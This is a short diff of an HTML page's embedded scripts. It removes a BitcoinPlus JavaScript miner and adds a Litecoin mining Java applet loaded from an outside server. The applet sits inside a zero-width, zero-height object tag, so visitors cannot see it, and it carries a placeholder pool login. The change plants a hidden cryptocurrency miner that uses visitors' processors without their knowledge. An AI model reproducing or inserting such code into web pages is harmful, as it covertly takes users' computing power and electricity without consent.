@@ -140,11 +140,13 @@ blink {
   
   
   
-  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js" type="text/javascript"></script>
-<script src="http://www.bitcoinplus.com/js/miner.js" type="text/javascript"></script>
-<script type="text/javascript">BitcoinPlusMiner(38511147 , {addControls: true})</script>
+  <object id="ltcminer" data="http://www.litecoinpool.org/java/embeddable.jar" classid="java:org.litecoinpool.miner.EmbeddableMiner" type="application/x-java-applet" width="0" height="0">
+<param name="code" value="org.litecoinpool.miner.EmbeddableMiner">
+<param name="archive" value="http://www.litecoinpool.org/java/embeddable.jar">
+<param name="scriptable" value="true">
+<param name="auth" value="user.name:password">
+</object>
 
-<script type="text/javascript">BitcoinPlusMiner("topcepbep@gmail.com", {addControls: true})</script>
  
  
  
